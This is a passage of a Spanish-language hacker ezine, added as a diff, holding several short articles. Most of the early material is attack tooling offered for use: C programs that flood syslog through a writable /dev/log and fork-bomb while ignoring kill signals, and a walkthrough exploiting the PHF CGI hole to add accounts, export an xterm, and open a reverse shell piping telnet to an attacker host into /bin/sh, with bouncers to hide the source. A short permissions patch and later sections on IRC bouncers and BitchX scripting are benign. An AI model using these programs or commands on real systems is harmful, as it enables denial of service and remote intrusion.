@@ -1,0 +1,1212 @@
+/----------------------------------------------------------------------------\
+|-[ 10 ]----[ Cortos ]----[ Variado ]----------------------------------------|
+\-----------------------------------------------------------------[ Varios ]-/
+
+Inaguramos seccion en 7a69ezine. En "Cortos" incluiremos aquellos articulos
+que debido a su pequeño tamaño no puedan ser incluidos en el indice general.
+Apartir de ahora las curiosidades que se encontraban en la seccion 
+"Noticias/Curiosidades" las encontrareis aqui :)
+
+Contenido:
+
+	1. Syslog SuSE & Other		Trycky		Bajo
+    2. Syslog jode aun mas		Ripe	  	Bajo	
+	3. Un comando remoto		Ripe		Bajo
+	4. Usando un bouncer		PAC-MAC		Muy Bajo
+	5. BitchX-Scripting			tuxisuau	Bajo
+	6. ProFTPd DoS				Jet-Li		Medio
+
+
+
+-------------------------------------------------------------------------------
+--{ 01 }---{ Syslog SuSE & Other }---------------------------------------------
+-------------------------------------------------------------------{ Trycky }--
+
+-=( TryckY )=--=( Syslog SuSE & Other )=--=( )=-
+
+-=( 01 )=- Explicacion del fallo .
+-=( 02 )=- Forma de Parcherse .
+-=( 03 )=- Contactar .
+
+No se si este tipo de "fallo" esta ya documentado por lo que si ya habia 
+sido advertido este error no vendrar mal recordarlo por que es demasiada 
+gente a las que es vulnerable y que de todas formas no es mu dificil de 
+hacer. Aunque esto dos tambien va a depender del ordenador q tenga uno no
+es lo mismo un 120 Mhz 16 Ram que un todo poderoso 600 Mhz 128 Ram .
+
+-=( 01 )=- Explicacion del fallo .
+
+Voy a comentar un fallo que ocurre en las Distribuiciones de linux (probadas 
+por mi) posiblemente por defecto esto ocurre con la funcion syslog o 
+directamente desde el programa logger. Estos programas envian a al demonio del 
+Syslogd una cadena de caracteres como si fuera un printf de los diferentes 
+tipos de mensajes de advertencia que existen (kern,authpriv,warn,...) debido a 
+esto podriamos colapsar el sistema por mala configuracion si tenemos posesion
+de una linea de este estilo en el  "/etc/syslogd.conf" : 
+
+*.* /dev/tty8 ; En verdad si tenemos esta linea sera lo mismo pero jodera aun
+mas xD .
+
+Con esta linea todos los mensajes serian enviados a la terminal 8 y creando
+un fichero de "/var/log/messages" muy grande ocasionando perdida de Disco 
+Duro y una nefasta organizacion de los logs del sistema aparte de que el los
+logs tienen que ser de unico uso del root . Por lo que con un programa simple
+podriamos ir generando mucha basura hacia la terminal 8 del sistema y llenanado
+el "/var/log/messages" :
+
+<++> syslog_gujero.c
+
+#include <stdio.h>
+#include <syslog.h>
+
+char buffer[24000];
+void main() {
+
+  int i,b;
+
+  for(b=1; b<=10000000; b++){
+
+  for (i=0; i<=24000; i++)
+    buffer[i]='H';
+
+
+  syslog(LOG_ERR, buffer);
+  printf("Y seguimos con esto %i",b);
+     }
+}
+
+<-->
+
+Tras algo de informacion nos damos cuenta que en la libreria "syslog.h" hace
+mencion al "/dev/log" : 
+
+#define _PATH_LOG       "/dev/log"
+
+Y tras dirigirnos a este archivo nos damos cuenta de otro grave compromiso de
+seguridad (tmp tanto pero hay que exagerar) :
+
+trycky@Lepton:~ > ls -l /dev/log
+srw-rw-rw-   1 root     root            0 Jun 28 21:51 /dev/log
+
+Andale pero mira que permisos tan restringidos uff buenos que estas cosas a
+veces nos salvan la vida :) .Nos damos cuenta de que en las distribuiciones hay
+tantas cosas por defecto que es aterrador utilizarlo de servidor sin antes 
+darle un ojeazo de ultima hora . Y mas si estamos por el IRC y damos shells tan
+contentos . 
+Pero la cosa no quedo a qui he hize un programa que hacia lo de antes pero este
+se ponia en modo background e iva lanzando muchas peticiones al syslog :
+
+<++> syslog_jode.c
+
+/*****************************************************************************/
+/* by trycky 2000 . syslog_jode , trycky_83@mixmail.com                      */
+/*                                                                           */
+/* to compile : are you sure ?                                               */
+/*                                                                           */
+/*****************************************************************************/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <signal.h>
+#include <syslog.h>
+
+#define MIRALOQUEDISE "Io soy mu vago por no leer ..."
+#define ALERTAROJA "Mensaca desde el kernel q nus caemos !!!"
+
+void jodemos ();
+
+char buffer[24000];
+int i,b;
+int hijo_pua;
+
+main()
+{
+  signal (SIGINT,SIG_IGN);
+  signal (SIGHUP,SIG_IGN);
+  signal (SIGTERM,SIG_IGN);
+  signal (SIGSTOP,SIG_IGN);	
+  printf(" by trycky 2000 . syslog_fuck , trycky_83@mixmail.com \n");
+  for(b=0;b<=99999;b++){
+    buffer[b]='A';
+  }
+  if (fork()) exit(0);
+    for(;;){
+      hijo_pua=fork();
+      if(!hijo_pua){
+        jodemos(); 
+      }
+    }
+  }
+}
+
+void jodemos() {
+  for (i=0; i<=28000; i++){
+    syslog(LOG_ERR, buffer);
+    syslog(LOG_USER, MIRALOQUEDISE);
+    syslog(LOG_EMERG, ALERTAROJA);
+    syslog(LOG_WARNING, buffer);
+    printf(". %d.\n",getpid());
+    return;
+  }
+}
+
+/* EOF : Digase End Of File */
+/* thx Ripe */
+
+<-->
+
+-=( 02 )=- Forma de Parcherse .
+
+La forma de parchearse del faño del log es cambiar el modo a uno mas 
+restringido como el 644 que prohibimos dar derecho de escritura en "/dev/log"
+
+Lepton:/dev # chmod 644 log
+Lepton:/dev # ls -l log
+srw-r--r--   1 root     root            0 Jun 28 21:51 log
+
+Claramente esto lo debeis de hacer como root .
+
+<++> parche.sh
+# Parche a lo pachanga pal /dev/log , by trycky
+#!/bin/bash
+
+ls -al /dev/log | awk '{printf $1}' > test
+
+if [ test = srw-r--r-- ]; then
+echo -ne "Tas parcheado o eso creo ;) .\n"
+else
+if [ "$UID" = 0 ]; then
+chmod 644 /dev/log
+echo -ne "Ya tas tas parcheado yeahh ;) .\n"
+else
+echo 'Has de ser root para poder parchearlo'
+fi
+fi
+<-->
+
+-=( 03 )=- Contactar .
+
+E-mail : trycky_83@mixmail.com 
+
+Para cualquier tipo de comentario o cosas del estilo , propuestas de mujeres ,
+propuestas de trabajo , ummm y alguna que otra cosilla si os apetece . Y si no
+por el IRC con el nick de trycky .
+
+by trycky (16-8 D.H)
+
+EOF.
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--{ 02 }---{ Syslog jode aun mas }---------------------------------------------
+---------------------------------------------------------------------{ Ripe }--
+
+Hemos visto como trycky nos ha planteado un problema de seguridad que permite
+relentizar un sistema, llenar los logs de mierda, y en muchos casos llegar a
+colgar la maquina. Ello gracias al codigo podeis ver un poco mas arriba.
+
+Pero no acaba aqui la cosal. Tras ver este mini-articulo de trycky, y su
+programilla syslog_jode, he decidido mejorarlo un poco. Las mejoras se limitan
+a hacer que jodemos() cree el proceso hijo ella misma, de manera que asi es
+posible llamarla desde si misma, multiplicando asi los procesos mucho mas
+rapido. Veamos un ejemplo con este programilla que crea multitud de procesos,
+gracias a llamadas recursibas.
+
+---/ forkpowah.c /---
+
+#include <unistd.h>
+
+int main(void) {
+  printf("Forkpowah By Ripe :PP\n");
+  printf("Vamo palla....\n");
+  for(;;) {
+    boom();
+  }
+}
+
+int boom(void) {
+  int child;
+  for(;;) {
+    child=fork();
+    if (child=0) boom();
+  }
+}
+
+---/ forkpowah.c /---
+
+Vemos como boom() se encarga de crear los procesos, con fork(), y hace que
+cada proceso llame a mas procesos... etc etc etc.
+
+La diferencia entre este programilla y el de trycky, es que en este *TODOS* 
+los procesos creados crean a su vez procesos, mientras que en de trycky, solo
+crea procesos uno de los procesos (el que arranca primero). Veamos ahora como
+se traduciria esto con el programa encargado machacar via syslod ;-)
+
+---/ syslog_jode2.c /---
+
+/*****************************************************************************/
+/* by trycky 2000 . syslog_jode , trycky_83@mixmail.com                      */
+/*                                                                           */
+/* Pequeñas mejoras por Ripe. Ahora syslog jode aun mas ;-)                  */
+/*                                                                           */
+/* to compile : are you sure ?                                               */
+/*                                                                           */
+/*****************************************************************************/
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <syslog.h>
+
+#define MIRALOQUEDISE "Io soy mu vago por no leer ..."
+#define ALERTAROJA "Mensaca desde el kernel q nus caemos !!!"
+
+char buffer[24000];
+
+main() {
+  signal (SIGINT,SIG_IGN);
+  signal (SIGHUP,SIG_IGN);
+  signal (SIGTERM,SIG_IGN);
+  signal (SIGSTOP,SIG_IGN);
+  memset(buffer, 0x80, 24000);
+  printf(" by trycky 2000 . syslog_fuck , trycky_83@mixmail.com \n");
+  printf("\n");
+  printf(" Pequeñas mejoras por Ripe. Ahora syslog jode aun mas ;-)\n");
+  for(;;) {
+    jodemos();
+  }
+}
+
+void jodemos() {
+  int child;
+  child=fork();
+  if (child==0) {
+    for (;;) {
+      syslog(LOG_ERR, buffer);
+      syslog(LOG_USER, MIRALOQUEDISE);
+      syslog(LOG_EMERG, ALERTAROJA);
+      syslog(LOG_WARNING, buffer);
+      printf(". %d.\n",getpid());
+      jodemos();
+    }
+  }
+}
+
+---/ syslog_jode2.c /---
+
+Ya sabeis, toca parchear :)
+
+------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--{ 03 }---{ Un comando remoto }-----------------------------------------------
+---------------------------------------------------------------------{ Ripe }--
+
+Es muy comun la situacion en la que un hacker se ve con la posiblidad de 
+ejecutar un comando remoto (¡¡viva los CGIs programados con el culo!!). Lo que
+con este mini-articulo trato de explicar es la forma de aprovechar este tipo
+de situaciones. Hay varias maneras de hacerlo y paso a comentar alguna.
+
+UserAdd
+^^^^^^^
+Lo primero que se nos podria ocurrir es añadir una cuenta de usuario. Seria
+muy facil ejecutar "useradd -p hax0r hacker", y luego entrar en la maquina 
+usando la aplicacion telnet. Pero eso no es tan facil, pues useradd solo suele 
+ser efectivo si se ejecuta con privilegios de administrador, y a la hora de 
+ejecutar nuestro comando remoto, nosotros no tenemos ni idea de nuestro UID 
+(aunque no es dificil mirarlo en las variables de entorno adecudas mediante 
+echo). Actualmente la ejecucion de CGIs no suele tener privilegios de root, 
+por lo que nos este comando remoto no funciona en practicamente ninguna 
+maquina. Aun asi veamos un ataque ejemplo, en el que victima.com es un server 
+con el mitico fallo PHF, y hacker.org somos nosotros.
+
+[root@hacker.org /root]# lynx http://victima.com/cgi-bin/phf?Qalias=%0useradd%20-p%20hax0r%20hacker
+
+[root@hacker.org /root]# telnet victima.com
+Trying 666.666.666.666...
+Escape character is '^]'.
+
+Login: hacker
+Password:
+
+[hacker@victima.com /]$
+
+
+Exportando un terminal X
+^^^^^^^^^^^^^^^^^^^^^^^^
+El metodo anterior solo surgira efecto si tenemos privilegios para modificar
+el fichero /etc/passwd, y no suele ser asi. Pero este que veremos a 
+continuacion funciona tengamos los privilegios que tengamos. Veamos como es...
+
+Supongo que la mayoria conocereis el parametro -display que se le puede pasar
+a cualquier aplicacion de las X, de todos modos, por si acaso, explicare de
+que va.
+
+El de funcionamiento de las X no es mas que una tipica transmision de datos
+cliente-servidor que normalmente usa la familia AF_UNIX, pero no es nada 
+compicado adaptarlo a AF_INET (¿Os suena de algo el puerto 6000?). Para ello
+se usa la opcion -display.
+
+Un hacker puede aprovechar esto para exportarse una aplicacion, y ¿que mejor
+que un xterm? ;-) Para ello hay que realizar lo siguiente:
+
+   -Autorizar a victima.com para que pueda exportar aplicaciones a nuestra
+    maquina. Se usara "xhost victima.com".
+
+   -Tener las X cargadas en nuestra maquina.
+
+   -Ejecutar "xterm -display hacker.org:0.0", donde hacker.org es el host del
+    hacker maloso >;->
+
+Veamos ahora un ejemplo de ataque a la misma maquina de antes.
+
+[root@hacker.org /root]# startx
+
+[root@hacker.org /root]# xhost victima.com
+
+[root@hacker.org /root]# lynx http://victima.com/cgi-bin/phf?Qalias=%0xterm%20-display%20hacker.org:0.0
+
+	[Y ya tenemos la xterm de victima.com en nuestro escritorio]
+
+Es posible que no te haga ninguna gracia poner tu IP hal hacer display. Si es 
+asi, puedes saldar facilmente este tema usando un bouncer de conexion directa.
+G-bouncer de Doing va de pm para este tipo de cosas. Veamos como seria 
+entonces el ataque.
+
+[root@hacker.org /root]# startx
+
+[root@hacker.org /root]# xhost condon.com
+
+[root@hacker.org /root]# telnet condon.com
+Trying 666.666.666.666...
+Escape character is '^]'.
+
+Login: pepe
+Password:
+
+[pepe@condon.com pepe]$ ./g_bcn 6000 hacker.org 6000
+ Generic bouncer - by Doing
+ Bouncer instalado!
+
+	[volviendo a nuestra apreciada maquina]
+
+[root@hacker.org /root]# lynx http://victima.com/cgi-bin/phf?Qalias=%0xterm%20-display%20condon.com:0.0
+
+        [Y ya tenemos la xterm de victima.com en nuestro escritorio]
+
+
+Pipeline hax0r socket /bin/sh
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+NOTA: En el momento en que se me ocurrio este metodo no lo habia visto
+      documentado en ninguna parte, pero tras comentarselo a ciertas
+      personas me dijeron que si, y que esta tecnica recibia el nombre de
+      "telnet inverso", pero yo he decidido ponerle "Pipeline hax0r socket 
+      /bin/sh" porque me parece mucho mas origina :P
+
+Como bien sabemos en UNIX es muy sencillo realizar redireccionamientos de
+decriptores de ficheros desde el mismo shell (usando metacaracteres como
+">", "<", "|"). Pues bien, usando un pipeline del estilo "in | comando | out",
+podemos gestionar la entrada y la salida del comando con in y con out, eso
+quiere decir que si hacemos "entrada | /bin/sh | salida", lo que entrada
+saque por stdout sera ejecutado por /bin/sh, y el resultado posterior mandado
+a salida (puede parecer un poco complejo, pero no lo es, ni mucho menos). 
+¿Que debemos tratar de hacer? Sencillo, ejecutar un comando que nos permita
+mandar lo que queramos a stdout, y otro que nos permita visualizar stdin...
+hummmm, pensemos :) ¿telnet? Bingo.
+
+Si el servidor remoto ejecuta "telnet hacker.org 1 | /bin/sh | telnet
+hacker.org 2" y hacker.org esta preparado para recibir las conexiones por
+los puertos 1 y 2, el hacker tenda un shell en su manos (aun que como veremos
+un shell algo incomoda :P).
+
+¿Como debe preparar el hacker su maquina? Facil.
+
+	[Estamos en el terminal 1]
+
+[root@hacker.org /root]# nc -v -l -p 1
+listening on [any] 1 ...
+
+	[Nos vamos hacia al terminal 2]
+
+[root@hacker.org /root]# nc -v -l -p 2
+listening on [any] 2 ...
+
+	[Ahora hacia el terminal 3 xD]
+
+[root@hacker.org /root]# lynx http://victima.com/cgi-bin/phf?Qalias=%0telnet%20hacker.org%201%20|%20/bin/sh%20|%20telnet%20hacker.org%202
+ 
+Y apartir de ahora lo que escribamos en el terminal 1 sera procesado por el
+/bin/shell de victima.com, y la salida del comando se nos mostrara por el
+terminal 2 (es algo incomodo, pero util en la situaciones en las que el
+UNIX victima.com no dispones de xterm).
+
+Tambien es posible usar 2 bouncer para esconderse en este ataque :)
+
+NOTA: Para poder realizar este ataque debemos tener privilegios para ejecutar
+      "telnet".
+
+------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--{ 04 }---{ Usando un bouncer }-----------------------------------------------
+------------------------------------------------------------------{ PAC_MAC }--
+
+¿Que es y como funciona un BouNCeR?   Para lelos, explicado muy por encima
+                         (by PAC-MAC)
+
+Bien, en primer lugar, este texto lo hago para que no me lo anden preguntando
+cada dos por tres en el IRC. Lo he explicado como unas 10000000000 veces ya.
+Bueno, pues alla va. Un Bouncer es una maquina que hace de puente entre un 
+servicio (IRC) y tu PC. Por ej. vamos a poner que nuestro bouncer es 
+mocosoft.com, pues bien, a traves de mocosoft.com nosotros nos
+conectariamos al IRC por medio de una ventana de IRC, y toda la informacion 
+que nosotros enviemos y recibamos pasara por mocosoft.com . Un Bouncer
+oculta nuestra IP y nuestra host, así que si a ti te atacan, tambien
+atacan a la maquina que  useis de bouncer, y si atacan al bouncer también
+te caeras tu. Hasta ahi queda claro lo que es un bouncer. Ahora pasamos a la 
+explicacion sobre como se usa.
+
+Pongamos de nuevo el ejemplo de mocosoft.com al que se accede por el puerto
+7777, lo primero que deberiais haceres conectar al bouncer a traves de vuestro
+cliente de IRC, asi que abrir una ventana de IRC y escribir lo siguiente,
+/server mocosoft.com 7777. Algunos Bouncers tienen clave, sobre todo si lo
+habeis conseguido en el canal #bnc de Dalnet, si la tiene os dira algo asi como
+Please use /quote PASS <password> to register, pues imaginaros que este tiene
+Password y que la password es windakoz, entonces deberiais escribir /quote PASS
+windakoz para tener acceso al bouncer. Una vez esteis dentro os dira algo asi
+Use /quote CONN <server>:[port] [pass] to connect and /quote HELP for info on
+other commands Ahora imaginar que quereis conectar al siguiente servidor de
+IRC; irc.irc.com al que se accede por el puerto 6667. Pues debereis poner
+/quote conn irc.irc.com 6667 windakoz y el bouncer os conectara con el servidor
+de irc. Ahi lo que os ha pedido es que pongais el servidor al que deseais
+conectar <server> seguido del puerto [port] y el password [pass].
+
+Pues ya sabeis lo que es un bouncer y como se conecta a un servidor de IRC.
+
+Ahora, como me sobra tiempo y no tengo nada mejor que hacer, os pasare a
+explicar otra cosa bastante util. Los Bouncers utilizan Vhosts, las Vhosts
+(Virtual Hosts) son varias ip's asiganadas a una maquina y cada una de ellas
+tiene un PTR distinto (PTR es le nombre de host asociado a una ip en el dns).
+Esto quiere decir que ese bouncer te da a escoger entre varias hosts, cada una
+con una ip diferente, para conectarte a un servicio (IRC). Para ver la lista de
+hosts de que dispone ese bouncer deberas introducir un comando que varia
+dependiendo de si es un bouncer o un ezbounce, si es un bouncer el comando es
+/quote vip y si es un ezbounce el comando sera /quote vhost.
+
+Imaginemos que mocosoft.com es un bouncer, pues deberiamos poner /quote vip
+para ver el listado (esto se debe poner antes de conectar al IRC con el
+bouncer). Nos saldria algo así:
+
+ /quote vip
+-> Server: vip
+-
+-mocosoft.com- Default Vhost: mocosoft.com
+-
+-mocosoft.com- Listing Vhosts
+-
+-mocosoft.com-  (0) ppp-144.32.1.45.dialuplosers.com
+-
+-mocosoft.com-  (1) ppp-129.dialuplosers.com
+-
+-mocosoft.com-  (2) wants.some.freepr0n.com
+-
+-mocosoft.com-  (3) is.addicted.to.freepr0n.com
+-
+-mocosoft.com-  (4) i.lied.when.i.said.u.were.a.goodphuck.com
+-
+-mocosoft.com-  (5) eight.hour.goodphuck.com
+-
+-mocosoft.com- End of Vhost list
+
+En este caso queremos coger el vhost ppp-144.32.1.45.dialuplosers.com Para
+escogerlo deberiamos escribir /quote vip ppp-144.32.1.45.dialuplosers.com.
+Entonces saldria esto:
+
+/quote vip ppp-144.32.1.45.dialuplosers.com
+-> Server: vip ppp-144.32.1.45.dialuplosers.com
+-
+-rm-rf.muahahah.com- Switching Vhost to ppp-144.32.1.45.dialuplosers.com (208.189.113.133)
+-
+
+El mensaje que os da significa que ya habeis escogido ese Vhost. Lo siguiente
+seria conectar al servicio (IRC) como antes os he descrito, con /quote conn
+irc.irc.com 6667 windakoz y ya os conectaria al IRC. Lo demas es como una
+sesion normal de IRC.
+
+En un ezbounce lo unico que cambian son los comandos, en vez de poner /quote
+vip para ver el listado de las Vhosts de deberiais de poner /quote Vhosts , y
+para escoger esa Vhost deberiais poner /quote Vhost
+ppp-144.32.1.45.dialuplosers.com
+
+El resto es igual que con el bouncer normal, osea, /quote conn irc.irc.com 6667
+windakoz.
+
+
+Bueno, ya solo me queda por explicar un par de comandos mas, aunque seguro que
+se me han pasado un monton de cosas por alto, xD. En los EZbounce hay un par de
+comandos que los bouncers no tienen, dichos comandos son DETACH y REATTACH.
+Imagina que quieres apagar tu ordenador y que tu nick siga en el IRC, como si
+dejaras el pc encendido toda la noche y conectado al IRC. Pues bien, con el
+comando DETACH puedes dejar al bouncer conectado mientras tu apagas el
+ordenador y te vas por ahi. Y cuando quieras recuperarlo solo tienes que usar
+el comando REATTACH. Nuestro ezbounce en este caso se llamara ezbounce.com y su
+password sera Hax0r, pues una vez estemos conectados al IRC, cuando quieras
+apagar el pc, para que el ezbounce siga conectado al IRC lo único que tendrás
+que poner es /quote ezbounce detach Hax0r y tu cliente de IRC se desconectara
+mientras que el ezbounce sigue en el IRC. Una vez hecho eso, en Status os
+aparecera algo asi:
+
+-> Server: ezbounce detach Hax0r
+-
+-ezbounce- Ok, detached... To reattach, you must use /quote REATTACH 5056 Hax0r
+-
+-ezbounce- Closing connection to you
+-
+*** Disconnected
+
+Una vez hecho esto, ya podeis apagar vuestro pc. Fijaros en esto -ezbounce- Ok,
+detached... To reattach, you must use /quote REATTACH 5056 Hax0r Pues eso
+quiere decir que cuando querais volver a conectar y seguir con esa sesion de
+IRC debereis escribir /quote REATTACH 5056 Hax0r El numero 5056 es como un
+numero de referencia, no olvideis ese numero si quereis volver a seguir con esa
+sesion de IRC.
+
+Cuando querais volver a coger el control debereis conectar primero al servidor
+del ezbounce y una vez dentro escribir /quote REATTACH 5056 Hax0r Para eso
+sirve el comando reattach. En algunos ezbouncers en vez de reattach con dos t
+puede ser con una, para ver la lista de comandos debereis escribir /quote help
+antes de entrar en el IRC.
+
+Hay unos cuantos comandos mas en los bouncers que todavia no os he explicado,
+los comandos varian un poco entre los bouncers, los ezbounces y los
+psybounces. Lo primero es decir que un bouncer es un programa, al igual que un
+ezbounce y un psybounce. Bien, en un Bouncer los comandos son:
+
+  *Main, sirve para identificarte como administrador de ese Bouncer, necesitas
+         la password de administrador. Si la password es hax0r pues el comando
+         seria /quote main hax0r
+
+  *Vip, ya he explicado para lo que sirve, hacer listado de vhosts y escoger
+        una.
+
+  *ident, sirve para cambiar tu ident, con el comando /quote ident nueva_ident
+
+  *keepalive, te devuelve al bouncer en caso de que la shell te desconecte, es
+              lo que pone en la ayuda del bouncer, nunca lo he usado.
+
+  *Conn, sirve para conectar a un servidor de IRC, con el comando /quote
+         servidor_irc puerto password
+
+  *VDF, te pone la vhost definida por defecto en la configuracion.
+
+  *VN, lo mismo pero con la vhost por defecto de la shell.
+
+Ahora os explicare los comandos de un ezbounce:
+
+  *Admin, sirve para identificarte como administrador de ese Bouncer,
+          necesitas la password de administrador. Si la password es hax0r pues
+          el comando seria /quote admin hax0r
+
+  *conn, es igual que con el bouncer.
+
+  *ezbounce, sirve para ejecutar comandos en el ezbounce cuando estas
+             conectado al IRC, el comando seria asi
+              /quote ezbounce "comando"
+
+  *EZB, un alias para el comando ezbounce.
+
+  *Interface, sirve para lo mismo que el comando vhost, el comando seria
+              /quote interface "vhost_que_hayas_escogido"
+
+  *Vhosts, sirve para ver un listado de las hosts virtuales de que dispone el
+           ezbounce. /quote vhosts
+
+  *Vhost, cuando hayas escogido la vhost que quieres ponerte escribes el
+          siguiente comando /quote vhost "la_vhost"
+
+  *Detach, para dejar el ezbounce conectado al IRC, esta explicado mas
+           extensamente arriba. /quote ezbounce detach pass
+
+  *Reattach, para volver a recuperar la conexion del ezbounce que dejaste en
+             el IRC, tambien viene explicado arriiba mas extensamente.
+             /quote reattach numero
+
+  *ident, lo mismo que en el bouncer. /quote ident "nueva_ident"
+
+  *Log, no he mirado para que sirve.
+
+  *MOTD, mensaje del dia.
+
+Pues esto es todo, seguro que se me olvidan un monton de cosas, pero espero
+haberos servido un poco de ayuda para entender lo que es un bouncer y como
+funciona. Pienso hacer mas textos sobre el tema explicando lo que es un
+Psybouncer y algunas cosas mas, pero eso sera mas adelante. Si despues de leer
+esto teneis alguna duda me podreis encontrar en el canal #bnc o en #la_kasita
+del irc-hispano con el nick PAC-MAC. Y recordar, en el IRC-Hispano no se
+permite usar bouncers ni ezbounces ni nada por el estilo. Este documento tiene
+un fin educativo :-) Gracias a ]K1ki[ y a ZeRoXT porque sin ellos no habria
+sido capaz de hacer este documento, y un saludo para el canal #hacker_novatos
+y para #hackworld. Gracias en especial a [gibs0n] por motivarme a hacer
+esto :-)
+
+-------------------------------------------------------------------------------
+
+
+-------------------------------------------------------------------------------
+--{ 05 }---{ BitchX-Scripting }------------------------------------------------
+-----------------------------------------------------------------{ tuxisuau }--
+
+Buenas, soy Tuxisuau y me podeis encontrar con facilidad en el IRC-Hispano, en
+canales linuxeros ;). El porqué de este articulo es el haber querido elaborar
+un script para hacerme el IRC'ing com BitchX más comodo y no haber encontrado
+un HOWTO ni nada parecido. Utilizar cada dia BitchX a secas es algo realmente
+pesado... k si /msg nick@deep.space identify 3133(5+2), k si /msg chan access
+#elitah add 450 z3r0k001... ufff k pesadez XD. Pues casi mejor dedicar un poco
+de atencion a las capacidades del BX y asi despues xatear de mejor humor y de
+verdad que seria del agrado de nuestros compañeros de IRC...
+
+(BitchX... pero k dice este tio? tranquilos, por si no lo conoceis aún, BitchX
+es un buen cliente de irc para consola basado en IrcII... si os interesa
+www.bitchx.org)
+
+Bueno, empecemos por el principio...
+
+Antes de intentar programar nada, seria interesante conocer a fondo los
+toggles y las opciones de este fantàstico cliente de IRC, para eso os remito
+ia al manual (RTFM).
+
+Las opciones se guardan usando /save pero hay variables k se graban y
+variables k no se graban (no me preguntes por qué...). Estas opciones van a
+parar a ~/.BitchX/BitchX.sav y se cargan al arrancar BitchX :).
+
+BX carga tambien ~/.bitchxrc (o en ~/.ircrc si usas el bx de los paquetes de
+debian/unstable, cosa que me provoco grandes dolores de cabeza...).
+
+Vamos por la faena...
+
+    _    _ _
+   / \  | (_) __ _ ___
+  / _ \ | | |/ _` / __|
+ / ___ \| | | (_| \__ \
+/_/   \_\_|_|\__,_|___/
+
+Whoaaah! k peazo letras XD Pues si, es el comando de scripting más utilizado.
+Conoceis su función? Exacto! Para variar es para crear nuestros propios
+aliases o sinonimos. Nos puede ahorrar mucha faena! :)
+
+Un ejemplo autoexplicativo seria...
+
+/alias whoami {msg nick info $N}
+
+Y al poner /whoami haria msg a nick diciendole "nick info $N".
+$N es una 'Special Variable' (segun la docu :) que devuelve nuestro nick
+actual :)
+
+k p0wah!!! (tranquilos, esto no es nada ;)
+
+Pues aqui teneis una preciosa lista de estas variables especiales para vuestro
+uso y disfrute...
+
+(Tomado directamente de la docu del BitchX-1.0c17)
+
+   Variable   Definición
+
+   $,         last person who sent you a MSG
+   $.         last person to whom you sent a MSG
+   $:         last person to join a channel you are on
+   $;         last person to send a public message to a channel you are on
+   $`         your current uptime
+   $A         text of your AWAY message, if any
+   $B         body of last MSG you sent
+   $C         current channel
+   $D         last person that NOTIFY detected a signon for
+   $E         idle time
+   $F         time client was started, $time() format
+   $G         the current value of set SHOW_NUMERICS_STR
+   $H         current server numeric being processed
+   $I         channel you were last INVITEd to
+   $J         client version text string
+   $K         current value of CMDCHARS
+   $L         current contents of the input line
+   $M         modes of current channel, if any
+   $N         current nickname
+   $O         value of STATUS_OPER if you are an irc operator
+   $P         if you are a channel operator in $C, expands to a '@'
+   $Q         nickname of whomever you are QUERYing
+   $R         version of current server
+   $S         current server name
+   $T         target of current input (channel or QUERY nickname)
+   $U         value of cutbuffer
+   $V         client release date (numeric version string)
+   $W         current working directory
+   $X         your /userhost $N address (user@host)
+   $Y         value of REALNAME
+   $Z         time of day (hh:mm)
+   $a         the full version string
+   $b         a smaller version string
+   $h         current running hook name
+   $n         current network name if available ie. efnet, dalnet
+   $s         the server port your on.
+   $t         the currently running alias name
+   $u         your away time
+   $v         is tcl supported or not
+   $$         a literal '$'
+
+Yo añado esto... (q tb esta en la docu pero perdido por otros lados)
+
+   $0         Primer parametro k le pases al alias
+   $1,2,3...  segundo, tercero, cuarto...
+   $L         TODO lo k le pases al alias de parametro
+
+Bueno, llegado aki seria interesante crearse unos alias bonitos y meterlos en
+nuestro estupendo ~/.bitchxrc...
+
+El formato de este fichero es un tanto simple... simplemente pon los comandos
+uno tras otro XD
+
+/alias figlet exec -o figlet $L
+/alias memo {msg memo send $L}
+/alias memolist {msg memo list}
+/alias memolast {msg memo read last}
+/alias memodel  {msg memo del$L}
+/alias memoread {msg memo read$L}
+
+Ejemplos utiles y todo xD. No hace falta la / pero se puede poner :)
+
+Por si lo desconocierais, figlet es un programilla muy bonito para hacer
+'banners' de texto a base de ascii. Un ejemplo seria el titulo 'Alias' XD.
+
+Y veamos ahora como crear nuestras propias variables...
+
+/assign ircpass mipassdenick
+
+Simple, verdad? Bueno, vamos a sacarle utilidad a esto...
+
+/alias identify msg nick@deep.space identify $ircpass
+De esta forma nos ahorramos de escribir 50 veces nuestra pass de nick si la
+usamos mas de una vez en nuestros scripts...
+
+Seria interesante no usar nombres de variable de una sola letra... pues estan
+reservadas para las variables especiales y solo lograriamos problemas y mas
+problemas...
+
+Vamos a complicar un poco esto :)
+
+/alias jj {
+        window swap 1
+        join #root
+        window swap 2
+        join #linux
+        window swap 3
+        join #debian
+        window swap 1 }
+
+Que haria esto? Pues abriria los canales en sus correspondientes ventanas y
+nos dejaria en la ventana 1 al acabar...
+/alias chanop {
+        if ([$0]) {
+                msg chan op $C $0}
+                unless ([$0]) {
+                msg chan unban $C
+                msg chan op $C $N}}
+
+Esto nos quitaria el ban (si fuera el caso) y nos daria op en el canal actual
+a nosotros mismos... o al nick que pasaramos de parametro. Es la primera vez
+que usamos if (que complicado, verdad?). Pues como de costumbre sirve para
+tomar decisiones segun se cumplan o no condiciones. En este caso, si le pasas
+un parametro chan da op al parametro XD. Unless es exactamente el contrario de
+if.
+
+/alias mchanop {
+        for ( @ num = 1, num < 11, @ num++ ) {
+                window swap $num
+                if ( ![$P] && [$C] ) {
+                msg chan op $C $N } } }
+
+Yuck! Esto se va complicando!
+Esto lo que haria es hacer una barrida de ventanas y pedir op a chan cada vez
+que encontrara un canal en el que no fueramos op.
+
+Aqui tenemos nuestro kerido FOR, con una sintaxis demasiado parecida a la del
+C, por ejemplo. Vemos tambien que usamos ! y && en el if para invertir y para
+requerir que se cumplan las dos condiciones, exactamente igual a cuando lo
+hacemos en C.
+
+/alias cycleop {
+        for ( @ num = 1, num < 11, @ num++ ) {
+                window swap $num
+                if ( ![$P] && [$C] ) {
+                cycle
+                wait  } } }
+
+Esto seria mas o menos lo mismo, pero usando cycles en ves de machacar al bot
+chan. Va muy bien con los autoops de los scripts de la gente...
+
+Bueno, ahi tenemos algo nuevo... wait. Sirve para parar el flujo hasta k se
+terminen los comandos anteriores, sease hasta k no termina el cycle no pasa a
